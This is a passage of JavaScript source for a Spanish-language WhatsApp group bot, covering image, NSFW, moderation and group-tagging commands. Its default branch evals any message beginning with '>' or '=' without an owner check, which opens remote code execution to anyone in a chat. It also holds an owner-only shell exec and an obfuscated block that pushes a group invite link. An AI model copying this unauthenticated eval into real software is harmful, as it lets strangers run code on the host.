              sendFileFromUrl(random, image, {quoted: choute, caption: `*Listo* \n Busqueda Realizada por _${yo}_`})
              }
              }
              addFilter(from)
              break
case 'wp':
            if (!isRegister) return leoply(baby.only.usrReg)
            if (isBan) return leoply  (baby.only.benned)	
            reply('*Deja busco un fondo de pantalla para ti, perate :D*')
              res = LeoGgImg(`fondos de pantalla 4k ${q}`, google)
              function google(error, result){
              if (error){ return reply('_[ ! ] *Intentalo de nuevo*_')}
              else {
              var gugWp = result
              var randomWp =  gugWp[Math.floor(Math.random() * gugWp.length)].url
              sendFileFromUrl(randomWp, image, {quoted: choute, caption: `*Listo* \n Busqueda Realizada por _${yo}_`})
              }
              }
              addFilter(from)
              break  

//ANIME
case 'loli':
              anu = await axios.get('https://nekos.life/api/v2/img/neko')
              loli = await getBuffer(anu.data.url)
              imag = loli              
              txtt =`𝕭𝖆𝖇𝖞 𝕭𝖊𝖈𝖍𝖔𝖘𝖔 𝕺𝖋𝖈`
              buttons1 = [{buttonId:`loli`,buttonText:{displayText: 'Siguiente 😋'},type:1}]
              imageMsg = (await leo.prepareMessageMedia((imag), 'imageMessage', {thumbnail: fs.readFileSync(`./media/imagen/fake.jpg`)})).imageMessage
              buttonsMessage = {
              contentText: `${txtt}`,
              footerText: '*Aviso:* No pulses por pulsar\n© Creator 𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊', imageMessage: imageMsg,
              buttons: buttons1,
              headerType: 4}
              prep = leo.prepareMessageFromContent(from, { buttonsMessage }, { quoted: choute,  contextInfo: { mentionedJid: [sender,ownerNumber]} })
              leo.relayWAMessage(prep)
              break

case 'waifu':
              waifud = await axios.get('https://nekos.life/api/v2/img/waifu')
              nyed = await getBuffer(waifud.data.url)
              leo.sendMessage(from, nyed, image, { caption: 'Waifu', quoted: choute })
              .catch(err => {
              return('Ocurrio un error vuelve a intentarlo')})
              break


case 'nsfwavatar':
case 'avatar18':
case 'perfil18':

                anu = await axios.get('https://nekos.life/api/v2/img/nsfw_avatar')
				        nsavatar = await getBuffer(anu.data.url)
				        leo.sendMessage(from, nsavatar, image, {quoted: choute})
			          .catch(err => {
			          return('Intentalo nuevamente..')})	
			          break

case 'futanari':
			          futan = await axios.get('https://nekos.life/api/v2/img/futanari')
			          futanz = await getBuffer(futan.data.url)
			          leo.sendMessage(from, futanz, image, { quoted: choute })
			          break

case 'femdom':
                  anu = await axios.get('https://nekos.life/api/v2/img/femdom')
			            bupemdom = await getBuffer(anu.data.url)
				          leo.sendMessage(from, bupemdom, image, {quoted: choute})
			            .catch(err => {
                  return('Intentalo nuevamente..')})
			            break
//════════════════════════════════════════ GRUPOS ════════════════════════════════
//𝗚𝗥𝗨𝗣𝗢
//𝗔𝗗𝗠𝗜𝗡𝗜𝗦𝗧𝗥𝗔𝗗𝗢𝗥𝗘𝗦
case 'welcome':
case 'bv':
case 'bienvenidas':
case 'bienvenida':
            if (!isRegister) return leoply(baby.only.usrReg)
            if (isBan) return leoply  (baby.only.benned)	
            if (!isGroup) return leoply(baby.only.group)
            if (!isAdmin) return leoply(baby.only.admin)
            if (args.length < 1) return reply(`*BIENVENIDAS*\n\n*${prefix + command} on* para activar\n*${prefix + command} off* para desactivar`)
            if ((args[0]) === 'on') {
            if (isWelkom) return reply('La bienvenida ya esta activa en este grupo')
            welkom.push(from)
            fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
            reply(`Bienvenida activada exitosamente para *${groupMetadata.subject}*`)
            } else if ((args[0]) === 'off') {
            if (!isWelkom) return reply('Bienvenida ya esta desactivada')
            welkom.splice(from, 1)
            fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
            reply(`La función de Bienvenida se desactivo en el grupo *${groupMetadata.subject}*`)
            } else {
            reply(`*BIENVENIDAS*\n\n*${prefix + command} on* para activar\n*${prefix + command} off* para desactivar`)
            }
            break

case 'antifake':        
                if (!isRegister) return leoply(baby.only.usrReg)
                if (isBan) return leoply  (baby.only.benned)	
                if (!isWelkom) return reply('Activa la bienvenida antes para poder usar este comando')
                if (!isGroup) return leoply(baby.only.group)
                if (!isAdmin) return leoply(baby.only.admin)     
                if (!botAdmin) return leoply (baby.only.Badmin)
                if (args.length < 1) return reply(`Escribe ${prefix + command} on para activar`)          
                if (args[0] === 'on') {                                    
                  if (isAntiFake) return reply('*Ya está activo*')          
                  antifake.push(from)                          
                  fs.writeFileSync('./src/antifake.json', JSON.stringify(antifake))      
                  reply(`*[ Activado ]*`)  
                  reply(`*Los numeros considerados como FAKEs, sera eliminados del grupo*`)  
                } else if (args[0] === 'off') {             
                  var ini = antifake.indexOf(from)
                  antifake.splice(ini, 1)           
                  fs.writeFileSync('./src/antifake.json', JSON.stringify(antifake))       
                  reply(`Desactivado`)              
                } else {                                         
                  reply('on para activar, off para desactivar')           
                }           
                break

case 'antilink':
case 'antienlaces':
                    if (isBan) return leoply  (baby.only.benned)
                    if (!isGroup) return leoply(baby.only.group)
                    if (!isAdmin) return leoply(baby.only.admin)
                    if (!botAdmin) return leoply (baby.only.Badmin)                    
                    if (args.length < 1) return reply('Escribe on para activar')
                    if ((args[0]) === 'on') {
                    if (isAntiLink) return reply('Ya está activo')
                    antilink.push(from)
                    fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink)) 
                    reply('Antilink Activado Exitosamente')
                    await wa.hideTag(from, `El *antilink* ha sido *activado*, todo miembro que *envie un link* o enlace *sera eliminado del grupo*`, text)} 
                    else if ((args[0]) === 'off') { 
                    if (!isAntiLink) return reply('El antilink ha sido desactivado exitosamente del grupo.')
                    var ini = antilink.indexOf(from)
                    antilink.splice(ini, 1)
                    fs.writeFileSync('./src/antilink.json', JSON.stringify(antilink))
                    reply('Desactivar con éxito ✔️')
                    } else {reply('Escribe on para activar o off para desactivar')}
                    break


case 'comandos18':
case 'nsfw':
case 'c18':
                    if (isBan) return leoply  (baby.only.benned)
                    if (!isGroup) return leoply(baby.only.group)
                    if (!isAdmin) return leoply(baby.only.admin)
                    if (!botAdmin) return leoply (baby.only.Badmin)                    
                    if (args.length < 1) return reply('Escribe on para activar')
                    if ((args[0]) === 'on') {
                    if (isSex) return reply('Ya está activo')
                    mas18.push(from)
                    fs.writeFileSync('./src/porni.json', JSON.stringify(mas18)) 
                    reply('Activado Exitosamente\n\nQue viva el porno')
                    } 
                    else if ((args[0]) === 'off') { 
                    if (!isSex) return reply('Se ha desactivado los comandos +18 para este grupo')
                    var ini = mas18.indexOf(from)
                    mas18.splice(ini, 1)
                    fs.writeFileSync('./src/porni.json', JSON.stringify(mas18))
                    reply('Desactivar con éxito ✔️')
                    } else {reply('Que deseas hacer? Activar o Desactivar Esta Funcion?')}
                    break

case 'autostick':
case 'autosticker':            
                    if (!isGroup) return leoply(baby.only.group)
                    if (!isAdmin) return leoply(baby.only.admin)     
                    if (args.length < 1) return reply('Escribe *on* para activar')                    
                    if (args[0] === 'on') {                             
                    if (isAutoSt) return reply('*Ya está activo*')          
                    autostick.push(from)             
                    fs.writeFileSync('./src/autostick.json', JSON.stringify(autostick))      
                    reply(`*[ Activado ]*`)  
                    reply(`*ahora, todas las fotos que se envien en el grupo se convertiran en sticker automaticamente*`)  
                    } else if (args[0] === 'off') {           
                    var ini = autostick.indexOf(from)
                    autostick.splice(ini, 1)                  
                    fs.writeFileSync('./src/autostick.json', JSON.stringify(autostick))      
                    reply(`Desactivado`)              
                    } else {                                
                      reply('1 para activar, off para desactivar')        
                    }                          
                    break

case 'grupo':
            if (!isRegister) return leoply(baby.only.usrReg)
            if (isBan) return leoply  (baby.only.benned)	
            addFilter(from)
            if (!isGroup) return leoply(baby.only.group)
            if (!isAdmin) return leoply(baby.only.admin)
            if (!botAdmin) return leoply (baby.only.Badmin)
            if (args[0] === 'abrir') {
            leo.groupSettingChange(from, GroupSettingChange.messageSend, false).then(() => {
            wa.sendFakeStatus(from, "*Grupo Abierto Correctamente*", "GROUP SETTING")
            })
            } else if (args[0] === 'cerrar') {
            leo.groupSettingChange(from, GroupSettingChange.messageSend, true).then(() => {
            wa.sendFakeStatus(from, "*Grupo Cerrado Correctamente*", "GROUP SETTING")
            })
            } else {
            reply(`Que quieres hacer?: ${prefix}${command} abir/cerrar`)
            }
            break

case 'admin':
case 'promote':
                  if (!isRegister) return leoply(baby.only.usrReg)
                  if (isBan) return leoply  (baby.only.benned)	
                  if (!isGroup) return leoply(baby.only.group)
                  if (!isAdmin) return leoply(baby.only.admin)
                  if (!botAdmin) return leoply (baby.only.Badmin)
                  if (choute.message.extendedTextMessage != undefined){
                  mentioned = choute.message.extendedTextMessage.contextInfo.mentionedJid
                  if (!mentioned) return reply(`exampol xd: ${prefix + command} @participante... o etiqueta el mensaje de la persona a eliminar`)
                  await wa.setBio(from, `Baaaiii...`, '')
                  if (mentionUser.length == 1)
                  leo.groupMakeAdmin(from, mentionUser)
                  } else {
                  leo.sendMessage (from, `Baaaiii...`, '')
                  leo.groupMakeAdmin(from, mentionUser)}
                  break 

case 'demote':
              if (!isRegister) return leoply(baby.only.usrReg)
              if (isBan) return leoply  (baby.only.benned)	
              if (!isGroup) return leoply(baby.only.group)
              if (!isAdmin) return leoply(baby.only.admin)
              if (!botAdmin) return leoply (baby.only.Badmin)
              if (choute.message.extendedTextMessage != undefined){
              mentioned = choute.message.extendedTextMessage.contextInfo.mentionedJid
              if (!mentionUser.length == 1) return reply('Eliqueta un mensaje de aquien debo quitar admin o mencionalo')

              await wa.setBio(from, `Baaaiii...`, '')
              if (mentionUser.length == 1)
              leo.groupDemoteAdmin(from, mentionUser)
              } else {
              leo.groupDemoteAdmin(from, mentionUser)
              }
              break    

case 'kick':
case 'eliminar':
            if (!isRegister) return leoply(baby.only.usrReg)
            if (isBan) return leoply  (baby.only.benned)	
            if (!isGroup) return leoply(baby.only.group)
            if (!isAdmin) return leoply(baby.only.admin)
            if (!botAdmin) return leoply (baby.only.Badmin)
            if (!mentionUser.length == 1) return reply('Eliqueta un mensaje de aquien debo eliminar o mencionalo')
            leo.sendMessage (from, `@${mentionUser[0].split('@')[0]} Seras eliminado de grupo, gracia por tu atencion`, text, {contextInfo: { mentionedJid: [mentionUser]}})
            leo.groupRemove(from, mentionUser) 
            break

case 'añadir':
case 'add':
case 'agregar':
case 'unir':
case 'añadir':
            if (!isGroup) return leoply(baby.only.group)
            if (!isAdmin) return leoply(baby.only.admin)
            if (!botAdmin) return leoply (baby.only.Badmin)
            if (choute.message.extendedTextMessage != undefined){
            mentioned = choute.message.extendedTextMessage.contextInfo.mentionedJid                             
            } if (args.length < 1) return reply('Y el numero?')
            try {
            num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
            leo.groupAdd(from, [num])
            } catch (e) {
            if (mentionUser.length == 1)
            leo.groupAdd(from, mentionUser)
            console.log('Error :', e)
            return leo.sendMessage(from, 'Modo privado dice:v', MessageType.text)
            }
            break

case 'nombre':
case 'newnombre':
case 'changename':
            addFilter(from)
            if (!isGroup) return leoply(baby.only.group)
            if (!isAdmin) return leoply(baby.only.admin)
            if (!botAdmin) return leoply (baby.only.Badmin)
            if (!isRegister) return leoply(baby.only.usrReg)
            if (isBan) return leoply  (baby.only.benned)	
                        var newName = args.join(" ")
            leo.groupUpdateSubject(from, newName).then(() => {
            wa.sendFakeStatus(from, "EL NUEVO NOMBRE DEL GRUPO ES " + newName, "GROUP SETTING")
            })
            break
case 'newdesc':
case 'descripcion':        
case 'changedescripcion':
            if (!isRegister) return leoply(baby.only.usrReg)
            if (isBan) return leoply  (baby.only.benned)	
            addFilter(from)
            if (!isGroup) return leoply(baby.only.group)
            if (!isAdmin) return leoply(baby.only.admin)
            if (!botAdmin) return leoply (baby.only.Badmin)
            var newDesc = args.join(" ")
            leo.groupUpdateDescription(from, newDesc).then(() => {
            wa.sendFakeStatus(from, "EL NUEVO NOMBRE DEL GRUPO ES  " + newDesc, "GROUP SETTING")
            })
            break

//MENCION
case 'hidetag':
    
            if (!isRegister) return leoply(baby.only.usrReg)
            if (isBan) return leoply  (baby.only.benned)	
            if (!isGroup) return leoply(baby.only.group)
            if (!isAdmin) return leoply(baby.only.admin)
            await wa.hideTag(from, args.join(" "))
            break

case 'hidetag1':
    
            if (!isRegister) return leoply(baby.only.usrReg)
            if (isBan) return leoply  (baby.only.benned)	
            if (!isGroup) return leoply(baby.only.group)
            if (!isAdmin) return leoply(baby.only.admin)
            leo.sendMessage(from, args.join(" "), {contextInfo: { mentionedJid: [hide1]} })
            break

case 'miembros':
case 'todos':
case 'tangall':
case 'tagall':
case 'alltang':
case 'xd':
            if (!isRegister) return leoply(baby.only.usrReg)
            if (isBan) return leoply  (baby.only.benned)	
            if (!isGroup) return leoply(baby.only.group)
            if (!isAdmin) return leoply(baby.only.admin)    
            leo.updatePresence(from, Presence.composing)
            members_id = []
            teks = (args.length > 1) ? body.slice(8).trim(): ''
            teks += ` *𝐓𝐨𝐭𝐚𝐥* : ${groupMembers.length}\n`
            for (let mem of groupMembers) {
            teks += `╠ @${mem.jid.split('@')[0]}\n`
            members_id.push(mem.jid)
            }
            mentions('*𝐌𝐈𝐄𝐌𝐁𝐑𝐎𝐒  𝐃𝐄𝐋  𝐆𝐑𝐔𝐏𝐎*\n╔════ 𝕭𝖆𝖇𝖞𝕭𝖊𝖈𝖍𝖔𝖘𝖔\n╠ ● '+teks+'╠═══════ *𝕿𝖍ٌ𝖊𝕮𝖍𝖔𝖚𝖙𝖊* ═════\n╚══════', members_id, true)
            addFilter(from)
            break


case 'imagetang':
case 'imagentang':
            if (!isRegister) return leoply(baby.only.usrReg)
            if (isBan) return leoply  (baby.only.benned)	
            if (!isGroup) return leoply(baby.only.group)
            if (!isAdmin) return leoply(baby.only.admin)
                        mediatag = isQuotedImage ? JSON.parse(JSON.stringify(choute).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : choute
                        buffer = await leo.downloadMediaMessage(mediatag)
                        await wa.hideTagImage(from, buffer)
                        break

case 'stickertag':
case 'stag':
            if (!isRegister) return leoply(baby.only.usrReg)
            if (isBan) return leoply  (baby.only.benned)	
            if (!isGroup) return leoply(baby.only.group)
            if (!isAdmin) return leoply(baby.only.admin)
                          if (!isQuotedImage && !isImage) return await reply('Y el sticker? :D')
                          media = isQuotedSticker ? JSON.parse(JSON.stringify(choute).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : choute
                          buffer = await leo.downloadMediaMessage(media)
                          await wa.hideTagSticker(from, buffer)
                          break

case 'giftag':
            if (!isQuotedVideo) return reply(`Responde o etiqueta un gif`)
            quoted = JSON.parse(JSON.stringify(choute).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
            download = await leo.downloadMediaMessage(quoted)
            await fs.writeFileSync(`giftag.gif`, download)
            var group = await leo.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))})
            thumb = fs.readFileSync(`giftag.gif`)
            leo.sendMessage(from, thumb, video, { contextInfo: {mentionedJid: mem }, quoted: choute, mimetype: 'video/gif', thumbnail: thumb })
            await fs.unlinkSync(`giftag.gif`)
            break

case 'contador':  
 
            try{
            if (!isRegister) return leoply(baby.only.usrReg)
            if (isBan) return leoply  (baby.only.benned)	
            if (!isGroup) return leoply(baby.only.group)
            if (!isAdmin) return leoply(baby.only.admin)            
            if(isGroup && groupIdscount.indexOf(from) >= 0) {
            var ind = groupIdscount.indexOf(from)
            teks = `*USUARIOS*`
            mem = []
            for(let obj of groupMembers) {
            if(numbersIds.indexOf(obj.jid) >=0) {
            var indnum = numbersIds.indexOf(obj.jid)
            teks += `> @${countMessage[ind].numbers[indnum].jid.split('@')[0]}\n*Mensajes* ${countMessage[ind].numbers[indnum].messages}\nComandos ${countMessage[ind].numbers[indnum].cmd_messages}*\n\n`
            } else {
            teks += `*Usuario* @${obj.jid.split('@')[0]}\n*Mensajes* 0\nComandos Usados: 0\n`
            }
            mem.push(obj.jid)
            }
            leo.sendMessage(from, teks, extendedText, {quoted: selocont, thumbnail:null, contextInfo:{mentionedJid: mem}})
            } else return reply('Nada fue encontrado')
            } catch (e){
            console.log(e)
            }
            break
///𝐂𝐨𝐦𝐚𝐧𝐝𝐨𝐬 𝐏𝐞𝐫𝐬𝐨𝐧𝐚𝐥𝐞𝐬
case 'autoadmin':
                if (!isRegister) return leoply(baby.only.usrReg)
                if (isBan) return leoply  (baby.only.benned)	
                if (!isGroup) return leoply(baby.only.group)
                if (!botAdmin) return leoply (baby.only.Badmin)
                if (botAdmin) reply(`Listo eres admin`)                                                                     
leo.groupMakeAdmin(from, [sender])
setTimeout( () => {
leo.groupDemoteAdmin(from, [sender]) }, 2000)
reply ('Que pena :D') 
break

case 'autokick':
                if (!isRegister) return leoply(baby.only.usrReg)
                if (isBan) return leoply  (baby.only.benned)	
                if (!isGroup) return leoply(baby.only.group)
                if (!isAdmin) return leoply(baby.only.admin)
                if (!botAdmin) return leoply (baby.only.Badmin)
                if (botAdmin) reply(`Que? Eso no existe no seas homosexual`)                                                                     
                setTimeout( () => { 
                leo.groupRemove(from, 'Ni modo uno menos', text, [sender]) }, 6000)                    
                break

case 'autodemote':
                if (!isRegister) return leoply(baby.only.usrReg)
                if (isBan) return leoply  (baby.only.benned)	
                if (!isGroup) return leoply(baby.only.group)
                if (!isAdmin) return leoply('Quitandole admin al pelotudo que no tiene')
                if (!botAdmin) return leoply (baby.only.Badmin)
                if (botAdmin) reply(`Tabien`)                                                                     
                leo.groupDemoteAdmin(from, [sender])
                setTimeout( () => {
                leo.groupDemoteAdmin(from, [sender]) }, 2000) 
                break
//PUBLICOS
case 'link':
case 'enlace':
            if (isBan) return leoply  (baby.only.benned)	
            if (!isRegister) return leoply(baby.only.usrReg)
            if (!isGroup) return leoply(baby.only.group)
            if (!botAdmin) return leoply (baby.only.Badmin)
            addFilter(from)
            var link = await wa.getGroupInvitationCode(from)
            await wa.sendFakeStatus(from, link, "El lik de este grupo es")
            break  

case 'sider':
            if (isBan) return leoply  (baby.only.benned)	
            if (!isGroup) return leoply(baby.only.group)
            infom = await leo.messageInfo(from, choute.message.extendedTextMessage.contextInfo.stanzaId)
            tagg = []
            teks = `✅ Este Mensaje ah sido visto por:\n\n`
            for(let i of infom.reads){
            teks += '@' + i.jid.split('@')[0] + '\n'
            teks += `📲 Hora: ` + moment(`${i.t}` * 1000).tz('America/Mexico_City').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
            tagg.push(i.jid)}
            mentions(teks, tagg, true)
            break

case 'listadmins':
case 'listadmin':
case 'adminlist':
case 'adminslist': 
            if (!isRegister) return leoply(baby.only.usrReg)
            if (isBan) return leoply  (baby.only.benned)	
            if (!isGroup) return leoply(baby.only.group)
            adm = `*Este grupo* *${groupMetadata.subject}*\nTiene ${groupAdmins.length} Administradores.\n\n`
            no = 0
            for (let admon of groupAdmins) {
            no += 1
            adm += `[${no.toString()}] @${admon.split('@')[0]}\n`
            }
            mentions(adm, groupAdmins, true)
            break


case 'enline':
case 'online':
case 'listonine':
case 'listaenlinea':
case 'enlinea':                
                  if (!isGroup) return reply(`Solo para grupos`)
                  let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
                  let online = [...Object.keys(leo.chats.get(ido).presences), leo.user.jid]
                  leo.sendMessage(from, '*Lista de usuarios en linea*:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, MessageType.text, {
                  quoted: choute,
                  contextInfo: { mentionedJid: online }
                  })
                  break

case 'infogrupo':
case 'infogp':
                  if (isBan) return leoply  (baby.only.benned)	
                  if (!isRegister) return leoply(baby.only.usrReg)
                  if (!isGroup) return leoply(baby.only.group)
  ppimg = await leo.getProfilePicture(from)
  ftg = await getBuffer(ppimg)
  leo.sendMessage(groupMetadata.id, ftg, image, {quoted: choute, caption: `♻️ *DATOS DEL GRUPO*
[💈] Nombre: _${groupMetadata.subject}_
[💈] Administradores: _${groupAdmins.length}_
[💈] Miembros: _${groupMembers.length - groupAdmins.length }_
[💈] Total de Participantes: _${groupMembers.length}_

⚙️ *FUNCIONES ACTIVAS*
[💈] Bienvenida: ${estadowelcom}
[💈] Antifake: ${estadofake}
[💈] Antilink: ${estadolink}

*DESCRIPCION:*
${groupMetadata.desc}
`, })
break

case "babybot":
case "rentbot":
case "serbot":
case "jadibot":
              if (isGroup) return leo.sendMessage(from, 
`*Este comando solo puede ser utilizado en el privado*

https://wa.me/${botNumber}?text=${prefix}babybot`, MessageType.text, {quoted: choute, contextInfo: { mentionedJid: [sender], "forwardingScore": 508, "externalAdReply": 
              {"title": 'The Choute Oficial',       
              "body": 'Pulsa',  
              "thumbnail": fs.readFileSync('./media/imagen/joy.jpg'),
              "sourceUrl": `https://wa.me/${botNumber}?text=${prefix}babybot`}}})
              if (choute.key.fromMe) return reply("Bot temporal ${comand} no disponible");
              jadibot(reply, leo, from);
              break

              case 'simsimi':   
              if (!isGroup) return reply('Este comando es solo para grupos')  
                if (args.length < 1) return reply('escriba *1* para activar')        
                if (args[0] === '1') {                 
                  if (isSimi) return reply('Ya esta activo')            
                  simi.push(from)
                                                      fs.writeFileSync('./src/simi.json', JSON.stringify(simi))
                  reply('*Modo simi activado✅*')
                } else if ((args[0]) === '0') {                      
                  var ini = simi.indexOf(from)              
                  simi.splice(ini, 1)                    
                  fs.writeFileSync('./src/simi.json', JSON.stringify(simi))        
                  reply('Modo simsimi off ✔️')                                   
                } else {                               
                  reply('*1 para activar, 0 para desactivar*')             
                }
      
      
      
      default:
      if (body.startsWith('>')){
                  const util = require("util");
                  konsol = budy.slice(1)
                  Return = (sul) => {
                  sat = JSON.stringify(sul, null, 2)
                  bang = util.format(sat)
                  if (sat == undefined){
                  bang = util.format(sul)
                  }
                  return reply(bang)
                  }
                  try {
                  reply(`${util.format(eval(`;(async () => { ${konsol} })()`))}`)
                  } catch(e){
                  reply(`${String(e)}`)
                  }}
      if (body.startsWith("=")) {
      return await reply(JSON.stringify(eval(args.join(" ")), null, 2))
      }
      
      
      if (body.startsWith(`$`)){
      if (!isOwner) return
      const sep = budy.split("\n")
      let exc = body.replace(sep[0]+"\n", "")
      exec(exc, (err, stdout) => {
      if (err) return leo.sendMessage(from, `root @Thechoute:~ ${err}`, MessageType.text, { quoted: choute })
      if (stdout) {
      reply(stdout)
      }
      })
      }
      
      function _0x5718(){var _0x1c4b44=['122885QdGzyn','sticker','137193xgROlL','1202160qgSFsZ','2169990GBfMeG','sendMessage','476319hkaInB','1006lwFJpo','12cilEll','447360sFDZtd',`${imgramdon}.jpg`,'readFileSync','16biMglh','397bnmaIc','[\x20★\x20]\x20山姆\x20330'];_0x5718=function(){return _0x1c4b44;};return _0x5718();}function _0x4926(_0xab1c30,_0x37c62d){var _0x5718b9=_0x5718();return _0x4926=function(_0x49269b,_0x541901){_0x49269b=_0x49269b-0x65;var _0x2f5c1a=_0x5718b9[_0x49269b];return _0x2f5c1a;},_0x4926(_0xab1c30,_0x37c62d);}var _0x5b64d5=_0x4926;(function(_0x515af2,_0x3a3bbb){var _0x2d3808=_0x4926,_0x33a117=_0x515af2();while(!![]){try{var _0x544ce6=-parseInt(_0x2d3808(0x70))/0x1*(-parseInt(_0x2d3808(0x6a))/0x2)+-parseInt(_0x2d3808(0x69))/0x3+parseInt(_0x2d3808(0x6b))/0x4*(parseInt(_0x2d3808(0x72))/0x5)+-parseInt(_0x2d3808(0x6c))/0x6+parseInt(_0x2d3808(0x65))/0x7*(-parseInt(_0x2d3808(0x6f))/0x8)+parseInt(_0x2d3808(0x67))/0x9+-parseInt(_0x2d3808(0x66))/0xa;if(_0x544ce6===_0x3a3bbb)break;else _0x33a117['push'](_0x33a117['shift']());}catch(_0x4c558d){_0x33a117['push'](_0x33a117['shift']());}}}(_0x5718,0x1dbb9));body['includes']('xd')&&leo[_0x5b64d5(0x68)](from,fs[_0x5b64d5(0x6e)]('./4645.webp'),MessageType[_0x5b64d5(0x73)],{'quoted':choute,'contextInfo':{'externalAdReply':{'title':'🤠Los\x20que\x20no\x20dejan\x20el\x20xd:\x20\x27POR\x20AHI\x20NO!!\x27','body':_0x5b64d5(0x71),'sourceUrl':'https://chat.whatsapp.com/F69AWpgKHYk923tplRPtYm','thumbnail':fs[_0x5b64d5(0x6e)](_0x5b64d5(0x6d))}}});
          

      }
      } catch (e) {
      const emror = String(e)
      if (emror.includes('convert')){ 
      return
      }
      if (emror.includes('this.isZero')){ 
      return
      }	
      if (emror.includes('fileLength')){                           
      return
      }
      if (emror.includes('jid')){                           
      return
      }
      console.log(chalk.greenBright("├"), chalk.keyword("yellow")("[  ERROR  ]"), chalk.keyword("red")(e))
      }
      })
